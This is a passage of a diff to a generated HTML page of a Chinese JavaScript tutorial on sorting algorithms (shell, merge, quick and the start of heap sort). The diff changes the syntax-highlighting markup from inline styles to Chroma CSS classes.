-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">function</span> shellSort(arr) {
-    <span style="color:#000;font-weight:bold">var</span> len <span style="color:#000;font-weight:bold">=</span> arr.length,
-        temp,
-        gap <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">1</span>;
-    <span style="color:#000;font-weight:bold">while</span>(gap <span style="color:#000;font-weight:bold">&lt;</span> len<span style="color:#000;font-weight:bold">/</span><span style="color:#099">3</span>) {          <span style="color:#998;font-style:italic">//动态定义间隔序列
-</span><span style="color:#998;font-style:italic"></span>        gap <span style="color:#000;font-weight:bold">=</span>gap<span style="color:#000;font-weight:bold">*</span><span style="color:#099">3</span><span style="color:#000;font-weight:bold">+</span><span style="color:#099">1</span>;
-    }
-    <span style="color:#000;font-weight:bold">for</span> (gap; gap<span style="color:#000;font-weight:bold">&gt;</span> <span style="color:#099">0</span>; gap <span style="color:#000;font-weight:bold">=</span> <span style="color:#0086b3">Math</span>.floor(gap<span style="color:#000;font-weight:bold">/</span><span style="color:#099">3</span>)) {
-        <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> i <span style="color:#000;font-weight:bold">=</span> gap; i <span style="color:#000;font-weight:bold">&lt;</span> len; i<span style="color:#000;font-weight:bold">++</span>) {
-            temp <span style="color:#000;font-weight:bold">=</span> arr[i];
-            <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> j <span style="color:#000;font-weight:bold">=</span> i<span style="color:#000;font-weight:bold">-</span>gap; j <span style="color:#000;font-weight:bold">&gt;</span> <span style="color:#099">0</span> <span style="color:#000;font-weight:bold">&amp;&amp;</span> arr[j]<span style="color:#000;font-weight:bold">&gt;</span> temp; j<span style="color:#000;font-weight:bold">-=</span>gap) {
-                arr[j<span style="color:#000;font-weight:bold">+</span>gap] <span style="color:#000;font-weight:bold">=</span> arr[j];
-            }
-            arr[j<span style="color:#000;font-weight:bold">+</span>gap] <span style="color:#000;font-weight:bold">=</span> temp;
-        }
-    }
-    <span style="color:#000;font-weight:bold">return</span> arr;
-}
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">function</span> <span class="nx">shellSort</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">len</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span>
+        <span class="nx">temp</span><span class="p">,</span>
+        <span class="nx">gap</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">while</span><span class="p">(</span><span class="nx">gap</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="o">/</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>          <span class="c1">//动态定义间隔序列
+</span><span class="c1"></span>        <span class="nx">gap</span> <span class="o">=</span><span class="nx">gap</span><span class="o">*</span><span class="mi">3</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">for</span> <span class="p">(</span><span class="nx">gap</span><span class="p">;</span> <span class="nx">gap</span><span class="o">&gt;</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">gap</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nx">gap</span><span class="o">/</span><span class="mi">3</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">gap</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">temp</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+            <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">j</span> <span class="o">=</span> <span class="nx">i</span><span class="o">-</span><span class="nx">gap</span><span class="p">;</span> <span class="nx">j</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span><span class="o">&gt;</span> <span class="nx">temp</span><span class="p">;</span> <span class="nx">j</span><span class="o">-=</span><span class="nx">gap</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nx">arr</span><span class="p">[</span><span class="nx">j</span><span class="o">+</span><span class="nx">gap</span><span class="p">]</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">j</span><span class="p">];</span>
+            <span class="p">}</span>
+            <span class="nx">arr</span><span class="p">[</span><span class="nx">j</span><span class="o">+</span><span class="nx">gap</span><span class="p">]</span> <span class="o">=</span> <span class="nx">temp</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><h3 id="归并排序">归并排序</h3>
 <p><img src="http://oe51jhwvd.bkt.clouddn.com/5.gif" alt="image"></p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">function</span> mergeSort(arr) {  <span style="color:#998;font-style:italic">//采用自上而下的递归方法
-</span><span style="color:#998;font-style:italic"></span>    <span style="color:#000;font-weight:bold">var</span> len <span style="color:#000;font-weight:bold">=</span> arr.length;
-    <span style="color:#000;font-weight:bold">if</span>(len <span style="color:#000;font-weight:bold">&lt;</span> <span style="color:#099">2</span>) {
-        <span style="color:#000;font-weight:bold">return</span> arr;
-    }
-    <span style="color:#000;font-weight:bold">var</span> middle <span style="color:#000;font-weight:bold">=</span> <span style="color:#0086b3">Math</span>.floor(len <span style="color:#000;font-weight:bold">/</span> <span style="color:#099">2</span>),
-        left <span style="color:#000;font-weight:bold">=</span> arr.slice(<span style="color:#099">0</span>, middle),
-        right <span style="color:#000;font-weight:bold">=</span> arr.slice(middle);
-    <span style="color:#000;font-weight:bold">return</span> merge(mergeSort(left), mergeSort(right));
-}
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">function</span> <span class="nx">mergeSort</span><span class="p">(</span><span class="nx">arr</span><span class="p">)</span> <span class="p">{</span>  <span class="c1">//采用自上而下的递归方法
+</span><span class="c1"></span>    <span class="kd">var</span> <span class="nx">len</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">len</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="kd">var</span> <span class="nx">middle</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="nx">len</span> <span class="o">/</span> <span class="mi">2</span><span class="p">),</span>
+        <span class="nx">left</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">middle</span><span class="p">),</span>
+        <span class="nx">right</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="nx">middle</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nx">merge</span><span class="p">(</span><span class="nx">mergeSort</span><span class="p">(</span><span class="nx">left</span><span class="p">),</span> <span class="nx">mergeSort</span><span class="p">(</span><span class="nx">right</span><span class="p">));</span>
+<span class="p">}</span>
 
-<span style="color:#000;font-weight:bold">function</span> merge(left, right)
-{
-    <span style="color:#000;font-weight:bold">var</span> result <span style="color:#000;font-weight:bold">=</span> [];
+<span class="kd">function</span> <span class="nx">merge</span><span class="p">(</span><span class="nx">left</span><span class="p">,</span> <span class="nx">right</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">result</span> <span class="o">=</span> <span class="p">[];</span>
 
-    <span style="color:#000;font-weight:bold">while</span> (left.length<span style="color:#000;font-weight:bold">&gt;</span><span style="color:#099">0</span> <span style="color:#000;font-weight:bold">&amp;&amp;</span> right.length<span style="color:#000;font-weight:bold">&gt;</span><span style="color:#099">0</span>) {
-        <span style="color:#000;font-weight:bold">if</span> (left[<span style="color:#099">0</span>] <span style="color:#000;font-weight:bold">&lt;=</span> right[<span style="color:#099">0</span>]) {
-            result.push(left.shift());
-        } <span style="color:#000;font-weight:bold">else</span> {
-            result.push(right.shift());
-        }
-    }
+    <span class="k">while</span> <span class="p">(</span><span class="nx">left</span><span class="p">.</span><span class="nx">length</span><span class="o">&gt;</span><span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nx">right</span><span class="p">.</span><span class="nx">length</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">left</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="nx">right</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
+            <span class="nx">result</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">left</span><span class="p">.</span><span class="nx">shift</span><span class="p">());</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">result</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">right</span><span class="p">.</span><span class="nx">shift</span><span class="p">());</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
 
-    <span style="color:#000;font-weight:bold">while</span> (left.length)
-        result.push(left.shift());
+    <span class="k">while</span> <span class="p">(</span><span class="nx">left</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span>
+        <span class="nx">result</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">left</span><span class="p">.</span><span class="nx">shift</span><span class="p">());</span>
 
-    <span style="color:#000;font-weight:bold">while</span> (right.length)
-        result.push(right.shift());
+    <span class="k">while</span> <span class="p">(</span><span class="nx">right</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span>
+        <span class="nx">result</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">right</span><span class="p">.</span><span class="nx">shift</span><span class="p">());</span>
 
-    <span style="color:#000;font-weight:bold">return</span> result;
-}
+    <span class="k">return</span> <span class="nx">result</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><h3 id="快速排序">快速排序</h3>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">function</span> quickSort(arr, left, right) {
-    <span style="color:#000;font-weight:bold">var</span> len <span style="color:#000;font-weight:bold">=</span> arr.length,
-        partitionIndex,
-        left <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">typeof</span> left <span style="color:#000;font-weight:bold">!=</span> <span style="color:#d14">&#39;number&#39;</span> <span style="color:#000;font-weight:bold">?</span> <span style="color:#099">0</span> <span style="color:#000;font-weight:bold">:</span> left,
-        right <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">typeof</span> right <span style="color:#000;font-weight:bold">!=</span> <span style="color:#d14">&#39;number&#39;</span> <span style="color:#000;font-weight:bold">?</span> len <span style="color:#000;font-weight:bold">-</span> <span style="color:#099">1</span> <span style="color:#000;font-weight:bold">:</span> right;
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">function</span> <span class="nx">quickSort</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">left</span><span class="p">,</span> <span class="nx">right</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">len</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">.</span><span class="nx">length</span><span class="p">,</span>
+        <span class="nx">partitionIndex</span><span class="p">,</span>
+        <span class="nx">left</span> <span class="o">=</span> <span class="k">typeof</span> <span class="nx">left</span> <span class="o">!=</span> <span class="s1">&#39;number&#39;</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="nx">left</span><span class="p">,</span>
+        <span class="nx">right</span> <span class="o">=</span> <span class="k">typeof</span> <span class="nx">right</span> <span class="o">!=</span> <span class="s1">&#39;number&#39;</span> <span class="o">?</span> <span class="nx">len</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">:</span> <span class="nx">right</span><span class="p">;</span>
 
-    <span style="color:#000;font-weight:bold">if</span> (left <span style="color:#000;font-weight:bold">&lt;</span> right) {
-        partitionIndex <span style="color:#000;font-weight:bold">=</span> partition(arr, left, right);
-        quickSort(arr, left, partitionIndex<span style="color:#000;font-weight:bold">-</span><span style="color:#099">1</span>);
-        quickSort(arr, partitionIndex<span style="color:#000;font-weight:bold">+</span><span style="color:#099">1</span>, right);
-    }
-    <span style="color:#000;font-weight:bold">return</span> arr;
-}
+    <span class="k">if</span> <span class="p">(</span><span class="nx">left</span> <span class="o">&lt;</span> <span class="nx">right</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">partitionIndex</span> <span class="o">=</span> <span class="nx">partition</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">left</span><span class="p">,</span> <span class="nx">right</span><span class="p">);</span>
+        <span class="nx">quickSort</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">left</span><span class="p">,</span> <span class="nx">partitionIndex</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="nx">quickSort</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">partitionIndex</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="nx">right</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
+<span class="p">}</span>
 
-<span style="color:#000;font-weight:bold">function</span> partition(arr, left ,right) {     <span style="color:#998;font-style:italic">//分区操作
-</span><span style="color:#998;font-style:italic"></span>    <span style="color:#000;font-weight:bold">var</span> pivot <span style="color:#000;font-weight:bold">=</span> left,                      <span style="color:#998;font-style:italic">//设定基准值（pivot）
-</span><span style="color:#998;font-style:italic"></span>        index <span style="color:#000;font-weight:bold">=</span> pivot <span style="color:#000;font-weight:bold">+</span> <span style="color:#099">1</span>;
-    <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> i <span style="color:#000;font-weight:bold">=</span> index; i <span style="color:#000;font-weight:bold">&lt;=</span> right; i<span style="color:#000;font-weight:bold">++</span>) {
-        <span style="color:#000;font-weight:bold">if</span> (arr[i] <span style="color:#000;font-weight:bold">&lt;</span> arr[pivot]) {
-            swap(arr, i, index);
-            index<span style="color:#000;font-weight:bold">++</span>;
-        }        
-    }
-    swap(arr, pivot, index <span style="color:#000;font-weight:bold">-</span> <span style="color:#099">1</span>);
-    <span style="color:#000;font-weight:bold">return</span> index<span style="color:#000;font-weight:bold">-</span><span style="color:#099">1</span>;
-}
+<span class="kd">function</span> <span class="nx">partition</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">left</span> <span class="p">,</span><span class="nx">right</span><span class="p">)</span> <span class="p">{</span>     <span class="c1">//分区操作
+</span><span class="c1"></span>    <span class="kd">var</span> <span class="nx">pivot</span> <span class="o">=</span> <span class="nx">left</span><span class="p">,</span>                      <span class="c1">//设定基准值（pivot）
+</span><span class="c1"></span>        <span class="nx">index</span> <span class="o">=</span> <span class="nx">pivot</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="nx">index</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="nx">right</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">pivot</span><span class="p">])</span> <span class="p">{</span>
+            <span class="nx">swap</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">index</span><span class="p">);</span>
+            <span class="nx">index</span><span class="o">++</span><span class="p">;</span>
+        <span class="p">}</span>        
+    <span class="p">}</span>
+    <span class="nx">swap</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">pivot</span><span class="p">,</span> <span class="nx">index</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nx">index</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
 
-<span style="color:#000;font-weight:bold">function</span> swap(arr, i, j) {
-    <span style="color:#000;font-weight:bold">var</span> temp <span style="color:#000;font-weight:bold">=</span> arr[i];
-    arr[i] <span style="color:#000;font-weight:bold">=</span> arr[j];
-    arr[j] <span style="color:#000;font-weight:bold">=</span> temp;
-}
+<span class="kd">function</span> <span class="nx">swap</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">j</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">temp</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+    <span class="nx">arr</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="nx">j</span><span class="p">];</span>
+    <span class="nx">arr</span><span class="p">[</span><span class="nx">j</span><span class="p">]</span> <span class="o">=</span> <span class="nx">temp</span><span class="p">;</span>
+<span class="p">}</span>
 </code></pre></td></tr></table>
 </div>
 </div><h3 id="堆排序">堆排序</h3>
 <p><img src="http://oe51jhwvd.bkt.clouddn.com/7.gif" alt="image"></p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
